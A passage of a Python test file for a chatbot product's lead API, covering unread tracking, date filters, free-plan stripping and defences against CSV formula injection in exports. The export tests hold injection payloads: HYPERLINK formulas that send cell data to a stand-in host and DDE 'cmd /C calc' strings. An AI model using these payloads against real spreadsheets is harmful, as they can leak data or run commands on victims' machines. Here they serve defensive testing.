"""Tests for lead routes. Unread tracking, mark-viewed, mark-all-viewed.

Covers the "unread leads" contract that backs the sidebar badge:
  - GET  /leads/stats     exposes `unread`
  - POST /leads/{id}/view is idempotent & sets `lead_viewed_at`
  - POST /leads/mark-all-viewed  bulk-clears unread for a bot
  - build_lead_response includes `unread` + `lead_viewed_at`
  - Legacy tier aliases (cold/warm/hot/qualified) still returned
"""

import csv
import io
from contextlib import contextmanager
from datetime import UTC, datetime, timedelta
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from app.api.auth import get_current_client_or_operator
from app.api.lead_routes import router


@pytest.fixture(autouse=True)
def _allow_leads_dashboard(monkeypatch):
    """Every route in this file assumes the caller has paid-tier leads
    access, the plan gates are exercised in ``test_plan_entitlements_service``
    and in ``TestFreePlanIntelligenceStripping`` / ``TestVisitorIntelligenceGating``
    below. Stub them here so we don't have to mock a full entitlements
    resolver in every test's session fixture. ``patch`` at import site so
    both the router-level dependency and the in-handler checks see the stub.
    """
    from app.api import lead_routes as _lead_routes

    monkeypatch.setattr(_lead_routes, "is_leads_dashboard_enabled", lambda *_a, **_k: True)
    monkeypatch.setattr(_lead_routes, "is_lead_intelligence_enabled", lambda *_a, **_k: True)
    monkeypatch.setattr(_lead_routes, "is_visitor_intelligence_enabled_for_bot", lambda *_a, **_k: True)


# ── Helpers ──────────────────────────────────────────────────────────────────


@contextmanager
def _session_context(session):
    yield session


def _client_auth(client_id: int = 1) -> dict:
    return {
        "type": "client",
        "entity": SimpleNamespace(id=client_id),
        "client_id": client_id,
        "operator_id": None,
    }


def _operator_auth(client_id: int = 1, operator_id: int = 7) -> dict:
    return {
        "type": "operator",
        "entity": SimpleNamespace(id=operator_id),
        "client_id": client_id,
        "operator_id": operator_id,
    }


def _build_app(auth_override=None):
    app = FastAPI()
    app.include_router(router)
    if auth_override:
        app.dependency_overrides[get_current_client_or_operator] = lambda: auth_override
    return app


def _make_session_row(session_id: str, bot_id: int = 1, lead_viewed_at=None, **overrides):
    base = dict(
        id=session_id,
        bot_id=bot_id,
        client_id=1,
        location=None,
        device=None,
        behavioral_score=0,
        page_url=None,
        referrer=None,
        utm_params=None,
        visit_count=1,
        bant_need=None,
        bant_timeline=None,
        bant_authority=None,
        bant_budget=None,
        bant_need_score=0,
        bant_budget_score=0,
        bant_authority_score=0,
        bant_timeline_score=0,
        bant_score=0,
        bant_tier="unqualified",
        dimension_scores=None,
        dimensions_assessed=0,
        bant_last_updated=None,
        qualification_framework="bant",
        status="bot",
        created_at=datetime(2026, 4, 1, tzinfo=UTC),
        last_active_at=datetime(2026, 4, 23, tzinfo=UTC),
        lead_viewed_at=lead_viewed_at,
    )
    base.update(overrides)
    return SimpleNamespace(**base)


def _install_scalars_chain(session_mock, *return_values):
    """Set session.execute to return values in order as .scalars().all()/.first()/.scalar_one_or_none()."""
    calls = iter(return_values)

    def _execute(*_args, **_kwargs):
        value = next(calls, [])
        result = MagicMock()
        scalars = MagicMock()

        # Support .scalars().all() and .scalars().first()
        if isinstance(value, list):
            scalars.all.return_value = value
            scalars.first.return_value = value[0] if value else None
        else:
            scalars.all.return_value = [value] if value is not None else []
            scalars.first.return_value = value
        result.scalars.return_value = scalars

        # Support .scalar_one_or_none()
        if isinstance(value, list):
            result.scalar_one_or_none.return_value = value[0] if value else None
        else:
            result.scalar_one_or_none.return_value = value

        # Support .scalar()
        if isinstance(value, int):
            result.scalar.return_value = value
        else:
            result.scalar.return_value = None

        # Support .all() for row-tuple queries (e.g. join returning tuples)
        result.all.return_value = value if isinstance(value, list) else []

        return result

    session_mock.execute.side_effect = _execute


# ── GET /leads/stats ─────────────────────────────────────────────────────────


class TestLeadStatsUnread:
    def test_stats_includes_unread_count(self, monkeypatch):
        """GET /leads/stats must expose an `unread` field scoped to the auth'd bots."""
        from app.api import lead_routes

        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        # Two viewed sessions, three unviewed sessions
        sessions = [
            _make_session_row("s1", lead_viewed_at=datetime.now(UTC)),
            _make_session_row("s2", lead_viewed_at=datetime.now(UTC)),
            _make_session_row("s3", lead_viewed_at=None),
            _make_session_row("s4", lead_viewed_at=None),
            _make_session_row("s5", lead_viewed_at=None),
        ]

        session = MagicMock()
        # execute() call order in lead_stats:
        #   1. client_bot_ids       → [1]
        #   2. sessions list        → sessions
        #   3. bots list            → [bot]
        #   4. unread count scalar  → 3
        _install_scalars_chain(session, [1], sessions, [bot], 3)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        app = _build_app(auth_override=_client_auth())
        client = TestClient(app)
        response = client.get("/leads/stats")

        assert response.status_code == 200
        body = response.json()
        assert body["unread"] == 3
        assert body["total"] == 5

    def test_stats_preserves_legacy_tier_aliases(self, monkeypatch):
        """Regression: cold/warm/hot/qualified + total + avg_score unchanged."""
        from app.api import lead_routes

        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        sessions = [_make_session_row("s1", lead_viewed_at=None)]

        session = MagicMock()
        _install_scalars_chain(session, [1], sessions, [bot], 1)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        app = _build_app(auth_override=_client_auth())
        response = TestClient(app).get("/leads/stats")

        assert response.status_code == 200
        body = response.json()
        for key in (
            "total",
            "unread",
            "unqualified",
            "mql",
            "sal",
            "sql",
            "cold",
            "warm",
            "hot",
            "qualified",
            "avg_score",
        ):
            assert key in body, f"missing key in stats: {key}"
        # cold is an alias for unqualified
        assert body["cold"] == body["unqualified"]

    def test_stats_unread_zero_when_all_viewed(self, monkeypatch):
        from app.api import lead_routes

        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        sessions = [_make_session_row("s1", lead_viewed_at=datetime.now(UTC))]

        session = MagicMock()
        _install_scalars_chain(session, [1], sessions, [bot], 0)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        app = _build_app(auth_override=_client_auth())
        response = TestClient(app).get("/leads/stats")

        assert response.status_code == 200
        assert response.json()["unread"] == 0


# ── ?days= trailing-window filter ────────────────────────────────────────────


class TestDaysFilter:
    """`days` narrows every count in the strip to a trailing window, scoped on
    `created_at` (not `last_active_at` — see the note beside the filter in
    `lead_routes.py`). Omitted, both routes stay all-time (asserted by every
    other test in this file, which calls neither route with `?days=`)."""

    def test_list_leads_applies_created_at_filter_when_days_given(self, monkeypatch):
        from app.api import lead_routes

        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        rows = [(_make_session_row("s1", lead_viewed_at=None), 1)]

        session = MagicMock()
        # execute() order in list_leads: client_bot_ids → results → bots → lead_infos
        _install_scalars_chain(session, [1], rows, [bot], [])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads?days=7")

        assert response.status_code == 200
        results_stmt = session.execute.call_args_list[1][0][0]
        assert "chat_sessions.created_at >=" in str(results_stmt)

    def test_list_leads_has_no_created_at_filter_by_default(self, monkeypatch):
        from app.api import lead_routes

        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        rows = [(_make_session_row("s1", lead_viewed_at=None), 1)]

        session = MagicMock()
        _install_scalars_chain(session, [1], rows, [bot], [])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads")

        assert response.status_code == 200
        results_stmt = session.execute.call_args_list[1][0][0]
        assert "chat_sessions.created_at >=" not in str(results_stmt)

    def test_stats_applies_created_at_filter_to_sessions_and_unread_when_days_given(self, monkeypatch):
        from app.api import lead_routes

        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        sessions = [_make_session_row("s1", lead_viewed_at=None)]

        session = MagicMock()
        # execute() order in lead_stats: client_bot_ids → sessions → bots → unread
        _install_scalars_chain(session, [1], sessions, [bot], 1)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads/stats?days=30")

        assert response.status_code == 200
        sessions_stmt = session.execute.call_args_list[1][0][0]
        unread_stmt = session.execute.call_args_list[3][0][0]
        assert "chat_sessions.created_at >=" in str(sessions_stmt)
        assert "chat_sessions.created_at >=" in str(unread_stmt)

    def test_stats_free_plan_applies_created_at_filter_when_days_given(self, monkeypatch):
        from app.api import lead_routes

        monkeypatch.setattr(lead_routes, "is_lead_intelligence_enabled", lambda *_a, **_k: False)
        session = MagicMock()
        # execute() order in the free branch: client_bot_ids → total scalar → unread scalar
        _install_scalars_chain(session, [1], 2, 1)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads/stats?days=7")

        assert response.status_code == 200
        total_stmt = session.execute.call_args_list[1][0][0]
        unread_stmt = session.execute.call_args_list[2][0][0]
        assert "chat_sessions.created_at >=" in str(total_stmt)
        assert "chat_sessions.created_at >=" in str(unread_stmt)

    def test_days_out_of_range_is_rejected(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads?days=0")

        assert response.status_code == 422

    def test_list_leads_applies_both_bounds_for_a_custom_range(self, monkeypatch):
        """Regression: `to_date` alone reached neither bound on `lead_stats`
        until `_windowed()` unified how every statement in this file applies
        `since`/`until` — this pins the `<=` half specifically, on `list_leads`."""
        from app.api import lead_routes

        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        rows = [(_make_session_row("s1", lead_viewed_at=None), 1)]

        session = MagicMock()
        _install_scalars_chain(session, [1], rows, [bot], [])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get(
            "/leads?from_date=2026-08-01&to_date=2026-08-20"
        )

        assert response.status_code == 200
        results_stmt = str(session.execute.call_args_list[1][0][0])
        assert "chat_sessions.created_at >=" in results_stmt
        assert "chat_sessions.created_at <=" in results_stmt

    def test_list_leads_rejects_from_date_after_to_date(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        # A caller with no bots short-circuits to an empty result before the
        # window is ever resolved, which would mask this check — give the
        # caller a bot so the malformed range is actually reached.
        _install_scalars_chain(session, [1])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get(
            "/leads?from_date=2026-08-20&to_date=2026-08-01"
        )

        assert response.status_code == 422

    def test_stats_applies_both_bounds_for_a_custom_range(self, monkeypatch):
        """The bug this pins: `lead_stats` computed `since` from `days` only
        and never read `from_date`/`to_date` at all, so a UI-driven custom
        range silently fell back to the workspace's all-time totals while
        `list_leads`, given the identical query string, filtered correctly."""
        from app.api import lead_routes

        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        sessions = [_make_session_row("s1", lead_viewed_at=None)]

        session = MagicMock()
        _install_scalars_chain(session, [1], sessions, [bot], 1)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get(
            "/leads/stats?from_date=2026-08-01&to_date=2026-08-20"
        )

        assert response.status_code == 200
        sessions_stmt = str(session.execute.call_args_list[1][0][0])
        unread_stmt = str(session.execute.call_args_list[3][0][0])
        for stmt in (sessions_stmt, unread_stmt):
            assert "chat_sessions.created_at >=" in stmt
            assert "chat_sessions.created_at <=" in stmt

    def test_stats_free_plan_applies_both_bounds_for_a_custom_range(self, monkeypatch):
        from app.api import lead_routes

        monkeypatch.setattr(lead_routes, "is_lead_intelligence_enabled", lambda *_a, **_k: False)
        session = MagicMock()
        _install_scalars_chain(session, [1], 2, 1)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get(
            "/leads/stats?from_date=2026-08-01&to_date=2026-08-20"
        )

        assert response.status_code == 200
        total_stmt = str(session.execute.call_args_list[1][0][0])
        unread_stmt = str(session.execute.call_args_list[2][0][0])
        for stmt in (total_stmt, unread_stmt):
            assert "chat_sessions.created_at >=" in stmt
            assert "chat_sessions.created_at <=" in stmt


# ── POST /leads/{session_id}/view ────────────────────────────────────────────


class TestMarkLeadViewed:
    def test_marks_lead_viewed_sets_timestamp(self, monkeypatch):
        from app.api import lead_routes

        lead = _make_session_row("s1", bot_id=1, lead_viewed_at=None)

        session = MagicMock()
        # Two execute calls expected:
        #   1. fetch client_bot_ids → [1]
        #   2. fetch lead row       → lead
        _install_scalars_chain(session, [1], lead)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        app = _build_app(auth_override=_client_auth())
        response = TestClient(app).post("/leads/s1/view")

        assert response.status_code == 204
        assert lead.lead_viewed_at is not None
        session.commit.assert_called_once()

    def test_mark_viewed_is_idempotent(self, monkeypatch):
        """Calling /view twice on an already-viewed lead is a no-op (no extra commit)."""
        from app.api import lead_routes

        already_viewed_at = datetime(2026, 4, 22, tzinfo=UTC)
        lead = _make_session_row("s1", bot_id=1, lead_viewed_at=already_viewed_at)

        session = MagicMock()
        _install_scalars_chain(session, [1], lead)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        app = _build_app(auth_override=_client_auth())
        response = TestClient(app).post("/leads/s1/view")

        assert response.status_code == 204
        # timestamp must not be overwritten
        assert lead.lead_viewed_at == already_viewed_at
        session.commit.assert_not_called()

    def test_mark_viewed_404_for_unknown_session(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        _install_scalars_chain(session, [1], None)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        app = _build_app(auth_override=_client_auth())
        response = TestClient(app).post("/leads/missing/view")

        assert response.status_code == 404

    def test_mark_viewed_rejects_other_client_lead(self, monkeypatch):
        """A lead belonging to bot_id not in the caller's bot_ids must 404."""
        from app.api import lead_routes

        # Caller owns bot 1; lead belongs to bot 99
        lead = _make_session_row("s1", bot_id=99, lead_viewed_at=None)

        # Route queries `WHERE session_id = ? AND bot_id IN (...)`; mismatch → scalar_one_or_none = None
        session = MagicMock()
        _install_scalars_chain(session, [1], None)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        app = _build_app(auth_override=_client_auth())
        response = TestClient(app).post("/leads/s1/view")

        assert response.status_code == 404
        # and the lead's state must not have changed
        assert lead.lead_viewed_at is None


# ── POST /leads/mark-all-viewed ──────────────────────────────────────────────


class TestMarkAllLeadsViewed:
    def test_mark_all_clears_unread_for_client_bots(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        # execute calls: 1. client_bot_ids → [1,2]; 2. bulk UPDATE → result mock
        _install_scalars_chain(session, [1, 2], [])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        app = _build_app(auth_override=_client_auth())
        response = TestClient(app).post("/leads/mark-all-viewed")

        assert response.status_code == 204
        session.commit.assert_called_once()
        # the UPDATE must have been executed
        assert session.execute.call_count >= 2

    def test_mark_all_with_bot_id_verifies_ownership(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        # execute order: 1. client_bot_ids → [1]; 2. owns_bot check → 1; 3. bulk UPDATE
        _install_scalars_chain(session, [1], 1, [])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        app = _build_app(auth_override=_client_auth())
        response = TestClient(app).post("/leads/mark-all-viewed?bot_id=1")

        assert response.status_code == 204

    def test_mark_all_rejects_foreign_bot(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        # 1. client_bot_ids → [1]; 2. owns_bot check → None (does not own bot 99)
        _install_scalars_chain(session, [1], None)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        app = _build_app(auth_override=_client_auth())
        response = TestClient(app).post("/leads/mark-all-viewed?bot_id=99")

        assert response.status_code == 403


# ── build_lead_response: unread flag ─────────────────────────────────────────


class TestFreePlanIntelligenceStripping:
    """Free = conversations only. The lead-intelligence layer (score / tier /
    BANT / location / device / signals / export) must be stripped or denied
    server-side, so a curl with a Free API key cannot recover what the UI
    renders as locked."""

    LOCKED_FIELDS = (
        "score",
        "bant_score",
        "behavioral_score",
        "tier",
        "status",
        "dimensions_assessed",
        "bant",
        "location",
        "device",
    )

    @staticmethod
    def _as_free(monkeypatch):
        from app.api import lead_routes

        monkeypatch.setattr(lead_routes, "is_lead_intelligence_enabled", lambda *_a, **_k: False)
        monkeypatch.setattr(lead_routes, "is_lead_source_attribution_enabled", lambda *_a, **_k: False)

    def test_list_strips_intelligence_fields_for_free(self, monkeypatch):
        from app.api import lead_routes

        self._as_free(monkeypatch)
        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        rows = [(_make_session_row("s1", lead_viewed_at=None, location="Mumbai", device="iPhone"), 4)]

        session = MagicMock()
        # execute() order in list_leads: client_bot_ids → results → bots → lead_infos
        _install_scalars_chain(session, [1], rows, [bot], [])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads")

        assert response.status_code == 200
        leads = response.json()["leads"]
        assert len(leads) == 1
        for locked in self.LOCKED_FIELDS:
            assert locked not in leads[0], f"free plan payload leaked '{locked}'"
        # The conversation surface survives untouched.
        assert leads[0]["session_id"] == "s1"
        assert leads[0]["chats"] == 4
        assert leads[0]["unread"] is True

    def test_list_ignores_tier_and_score_filters_for_free(self, monkeypatch):
        """Tier/score filters would leak the locked qualification by
        elimination, so on Free they are ignored rather than applied."""
        from app.api import lead_routes

        self._as_free(monkeypatch)
        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        rows = [(_make_session_row("s1", lead_viewed_at=None), 1)]

        session = MagicMock()
        _install_scalars_chain(session, [1], rows, [bot], [])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads?tier=sql&min_score=90")

        assert response.status_code == 200
        assert len(response.json()["leads"]) == 1

    def test_stats_returns_only_total_and_unread_for_free(self, monkeypatch):
        from app.api import lead_routes

        self._as_free(monkeypatch)
        session = MagicMock()
        # execute() order in the free branch of lead_stats:
        # client_bot_ids → total count scalar → unread count scalar
        _install_scalars_chain(session, [1], 5, 3)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads/stats")

        assert response.status_code == 200
        assert response.json() == {"total": 5, "unread": 3}

    def test_export_is_403_for_free(self, monkeypatch):
        from app.api import lead_routes

        self._as_free(monkeypatch)
        session = MagicMock()
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads/export")

        assert response.status_code == 403
        detail = response.json()["detail"]
        assert detail["error"] == "feature_not_available"
        assert detail["feature"] == "lead_intelligence"

    def test_detail_strips_intelligence_and_signals_for_free(self, monkeypatch):
        from app.api import lead_routes

        self._as_free(monkeypatch)
        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        lead_session = _make_session_row("s1", lead_viewed_at=None)
        message = SimpleNamespace(
            role="user",
            content="hello",
            created_at=datetime(2026, 4, 2, tzinfo=UTC),
            feedback=None,
        )

        session = MagicMock()
        # execute() order in get_lead_detail (free): bot_ids → chat_session →
        # bot → lead_info → messages. No signals query when intelligence is off.
        _install_scalars_chain(session, [1], lead_session, bot, None, [message])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads/s1")

        assert response.status_code == 200
        lead = response.json()
        for locked in self.LOCKED_FIELDS:
            assert locked not in lead, f"free plan detail leaked '{locked}'"
        assert "signals" not in lead, "free plan detail leaked the BANT signal evidence trail"
        # The transcript itself is the free surface, it must survive.
        assert [m["content"] for m in lead["messages"]] == ["hello"]

    def test_paid_detail_keeps_signals(self, monkeypatch):
        """Guard the other direction: the stripping must not touch paid plans."""
        from app.api import lead_routes

        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        lead_session = _make_session_row("s1", lead_viewed_at=None)
        signal = SimpleNamespace(
            dimension="need",
            signal_text="we need this now",
            extracted_value="Urgent need",
            confidence=0.9,
            score_before=0,
            score_after=20,
            created_at=datetime(2026, 4, 3, tzinfo=UTC),
        )

        session = MagicMock()
        monkeypatch.setattr(lead_routes, "is_lead_source_attribution_enabled", lambda *_a, **_k: False)
        # execute() order (paid): bot_ids → chat_session → bot → lead_info →
        # messages → signals.
        _install_scalars_chain(session, [1], lead_session, bot, None, [], [signal])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads/s1")

        assert response.status_code == 200
        lead = response.json()
        assert lead["score"] == 0
        assert lead["tier"] == "unqualified"
        assert len(lead["signals"]) == 1
        assert lead["signals"][0]["dimension"] == "need"


class TestBuildLeadResponseUnread:
    def test_includes_unread_true_when_lead_viewed_at_is_null(self):
        from app.services.lead_service import build_lead_response

        session = _make_session_row("s1", lead_viewed_at=None)
        payload = build_lead_response(session, None, message_count=0, bot=None)

        assert payload["unread"] is True
        assert payload["lead_viewed_at"] is None

    def test_includes_unread_false_when_lead_viewed_at_is_set(self):
        from app.services.lead_service import build_lead_response

        viewed_at = datetime(2026, 4, 22, 10, 0, 0, tzinfo=UTC)
        session = _make_session_row("s1", lead_viewed_at=viewed_at)
        payload = build_lead_response(session, None, message_count=0, bot=None)

        assert payload["unread"] is False
        assert payload["lead_viewed_at"] == viewed_at.isoformat()


# ── GET /leads/export. CSV injection ────────────────────────────────────────
#
# The escape itself is unit-tested in ``test_csv_safety.py``. These tests prove
# it is wired into the file a customer actually downloads, column by column,
# the half a refactor can quietly break. Every string column here is filled by
# someone outside the server: the session id is minted by the widget, the
# contact fields are typed into the lead form by a visitor, the BANT values are
# LLM-extracted from what that visitor typed, location/device are derived from
# request headers, and the attribution columns come off the host page's URL.

FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")

# One payload per untrusted column, each a different OWASP trigger, so a
# regression that drops the escape from a single column still fails loudly.
_INJECTED_SESSION_ID = '=HYPERLINK("https://evil.test/?"&A1,"Click")'
_INJECTED_NAME = '+cmd|" /C calc"!A0'
_INJECTED_EMAIL = "@SUM(1+1)*cmd|' /C calc'!A0"
_INJECTED_PHONE = "-2+3+cmd|' /C calc'!A0"
_INJECTED_COMPANY = '=HYPERLINK("https://evil.test/?"&A2,"Click")'
_INJECTED_NEED = "=1+1"
_INJECTED_BUDGET = "+1+1"
_INJECTED_AUTHORITY = "-1+1"
_INJECTED_TIMELINE = "@1+1"
# Pipe-free, unlike its siblings: the Location column is redacted by
# ``visitor_privacy.redact_visitor_ip`` before it is escaped, and that redaction
# cuts at the first "|", a payload containing one would arrive here truncated
# and this sweep would be asserting against the redactor instead of the escape.
# The redaction is covered on its own in ``TestExportVisitorIpRedaction`` below.
_INJECTED_LOCATION = "=cmd$' /C calc'!A0"
_INJECTED_DEVICE = "\t=1+1"


def _export_lead_info(session_id: str = "s1", **overrides):
    base = dict(
        session_id=session_id,
        name="Priya",
        email="priya@infosys.com",
        phone="+91 98000 00000",
        company="infosys.com",
    )
    base.update(overrides)
    return SimpleNamespace(**base)


def _call_export(
    monkeypatch,
    chat_session,
    lead_info,
    *,
    attribution: bool,
    msg_count: int = 4,
    bant_config=None,
):
    """Drive ``GET /leads/export`` over a mocked session and return the response.

    ``bant_config`` selects the bot's qualification framework. ``None`` gives
    the BANT preset, ``{"framework": "meddic"}`` a bot whose dimensions are not
    need/budget/authority/timeline at all.
    """
    from app.api import lead_routes

    bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=bant_config)
    session = MagicMock()
    # execute() order in export_leads_csv, with no bot_id filter:
    #   client_bot_ids → results (session, msg_count) → bots → lead_infos
    _install_scalars_chain(session, [1], [(chat_session, msg_count)], [bot], [lead_info])
    monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))
    monkeypatch.setattr(
        lead_routes,
        "is_lead_source_attribution_enabled",
        lambda *_a, **_k: attribution,
    )
    return TestClient(_build_app(auth_override=_client_auth())).get("/leads/export")


def _export_rows(response) -> list[list[str]]:
    return list(csv.reader(io.StringIO(response.text)))


class TestExportCsvInjection:
    def test_export_neutralises_every_untrusted_base_column(self, monkeypatch):
        """The load-bearing one: a payload in each column, all of them defused.

        Scope note, because it is easy to over-read: this pins the columns that
        exist today. It cannot fail for a column added tomorrow, a new column
        carries no payload in this fixture, so the sweep never sees it. What
        makes a future column safe is the ``csv_safe_row`` funnel in the route,
        and that property is tested where it lives, in ``test_csv_safety.py``.
        """
        chat_session = _make_session_row(
            _INJECTED_SESSION_ID,
            location=_INJECTED_LOCATION,
            device=_INJECTED_DEVICE,
            bant_need=_INJECTED_NEED,
            bant_budget=_INJECTED_BUDGET,
            bant_authority=_INJECTED_AUTHORITY,
            bant_timeline=_INJECTED_TIMELINE,
        )
        lead_info = _export_lead_info(
            session_id=_INJECTED_SESSION_ID,
            name=_INJECTED_NAME,
            email=_INJECTED_EMAIL,
            phone=_INJECTED_PHONE,
            company=_INJECTED_COMPANY,
        )

        response = _call_export(monkeypatch, chat_session, lead_info, attribution=False)
        assert response.status_code == 200, response.text

        rows = _export_rows(response)
        assert len(rows) == 2, rows
        header, row = rows

        # No cell in the file can open as a formula. Headers included, since a
        # header is a cell too.
        for cell in header + row:
            assert not cell.startswith(FORMULA_TRIGGERS), cell

        # And nothing was dropped on the way: each payload survives verbatim
        # behind its quote, so the export stays a faithful record.
        for column, payload in (
            ("Session ID", _INJECTED_SESSION_ID),
            ("Name", _INJECTED_NAME),
            ("Email", _INJECTED_EMAIL),
            ("Phone", _INJECTED_PHONE),
            ("Company", _INJECTED_COMPANY),
            ("Need", _INJECTED_NEED),
            ("Budget", _INJECTED_BUDGET),
            ("Authority", _INJECTED_AUTHORITY),
            ("Timeline", _INJECTED_TIMELINE),
            ("Location", _INJECTED_LOCATION),
            ("Device", _INJECTED_DEVICE),
        ):
            assert row[header.index(column)] == f"'{payload}", column

    def test_export_neutralises_the_attribution_columns(self, monkeypatch):
        """Standard+ adds six columns lifted straight off the host page's URL.

        An attacker never needs an OyeChats account for these: they link a
        visitor to the *customer's own* site with a crafted query string, the
        widget records it, and the payload lands in the customer's export.
        """
        chat_session = _make_session_row(
            "s1",
            referrer="=1+1",
            page_url="+1+1",
            utm_params={
                "utm_source": '=HYPERLINK("https://evil.test/?"&A1,"Click")',
                "utm_medium": "@SUM(1+1)",
                "utm_campaign": "-2+3",
            },
            visitor_journey=[{"path": "=cmd|' /C calc'!A0"}, {"path": "/pricing"}],
        )

        response = _call_export(monkeypatch, chat_session, _export_lead_info(), attribution=True)
        assert response.status_code == 200, response.text

        rows = _export_rows(response)
        header, row = rows
        for column in ("Source", "Medium", "Campaign", "Referrer", "Landing Page", "Journey"):
            cell = row[header.index(column)]
            assert cell.startswith("'"), column
            assert not cell.startswith(FORMULA_TRIGGERS), column

        # The journey keeps both hops, the escape guards the leading character
        # of the joined summary, it does not truncate it.
        assert row[header.index("Journey")] == "'=cmd|' /C calc'!A0 → /pricing"

    def test_export_leaves_an_ordinary_lead_untouched(self, monkeypatch):
        """No stray quotes on real data.

        The email case matters most: the trigger is a *leading* ``@``, so
        ``priya@infosys.com`` must survive intact or every export in the
        product grows a cosmetic wart. Commas and quotes stay the csv writer's
        job, the escape must not reach for them.
        """
        chat_session = _make_session_row("s1", location="Mumbai, India", device="iPhone")
        lead_info = _export_lead_info(phone="98000 00000", company='Acme, Inc. "Main"')

        response = _call_export(monkeypatch, chat_session, lead_info, attribution=False)
        assert response.status_code == 200, response.text

        header, row = _export_rows(response)
        assert row[header.index("Session ID")] == "s1"
        assert row[header.index("Name")] == "Priya"
        assert row[header.index("Email")] == "priya@infosys.com"
        assert row[header.index("Phone")] == "98000 00000"
        assert row[header.index("Company")] == 'Acme, Inc. "Main"'
        assert row[header.index("Location")] == "Mumbai, India"

    def test_export_escapes_an_e164_phone_number_and_that_is_intended(self, monkeypatch):
        """The known cost of the defence, pinned so nobody "fixes" it later.

        ``+91 98000 00000`` starts with ``+``, so it picks up a leading quote
        like any other triggering cell. Visible in the sheet, and on India's
        market that is most rows. It is still the right call: the alternative
        is exempting values that "look like" a phone number, and ``+1+1`` looks
        exactly as numeric as ``+91``. A heuristic here is a hole, so the
        cosmetic cost is accepted deliberately rather than engineered around.
        """
        response = _call_export(
            monkeypatch,
            _make_session_row("s1"),
            _export_lead_info(phone="+91 98000 00000"),
            attribution=False,
        )
        assert response.status_code == 200, response.text

        header, row = _export_rows(response)
        assert row[header.index("Phone")] == "'+91 98000 00000"

    def test_export_keeps_server_computed_columns_numeric(self, monkeypatch):
        """Score and message count must not gain a quote.

        They are integers this service computed, never attacker input, and a
        leading ``'`` would turn them into text in the recipient's sheet.
        Breaking every SUM and sort built on the export.
        """
        chat_session = _make_session_row("s1")

        response = _call_export(monkeypatch, chat_session, _export_lead_info(), attribution=False, msg_count=7)
        assert response.status_code == 200, response.text

        header, row = _export_rows(response)
        # Exact values plus an explicit "no escape quote", rather than a shape
        # check like `.isdigit()`, a shape check passes for any digit string
        # and so cannot distinguish the value that is here from the value the
        # test is meant to defend.
        assert row[header.index("Messages")] == "7"
        assert row[header.index("Score")] == "0"
        for column in ("Messages", "Score"):
            assert not row[header.index(column)].startswith("'"), column

    def test_export_neutralises_a_cr_prefixed_value(self, monkeypatch):
        """The CR case, asserted on the raw body.

